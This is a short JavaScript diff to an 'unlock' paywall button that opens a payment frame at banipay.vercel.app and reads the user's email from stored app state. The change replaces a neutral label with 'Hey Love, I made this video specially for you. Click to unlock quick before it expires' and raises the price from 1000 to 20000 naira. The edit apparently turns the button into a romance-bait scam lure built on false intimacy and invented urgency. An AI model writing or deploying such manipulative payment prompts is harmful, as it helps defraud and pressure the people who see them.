@@ -26,7 +26,7 @@ function initUnlockButton(triggerImg) {
     <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" fill="white" viewBox="0 0 24 24">
       <path d="M3 22v-20l18 10-18 10z"/>
     </svg>
-    unlock my special content
+    Hey Love, I made this video specially for you. Click to unlock quick before it expires. (₦20,000.00)
   `;
 
   wrapper.appendChild(btn);
@@ -46,7 +46,7 @@ function initUnlockButton(triggerImg) {
       inf = {};
     }
     const userEmail = inf?.state?.user?.email || "No Email Provided";
-    const amount = "1000";
+    const amount = "20000";
 
     const existingFrame = document.querySelector("#app-frame-zbFWp0");
     const url = new URL("https://banipay.vercel.app");
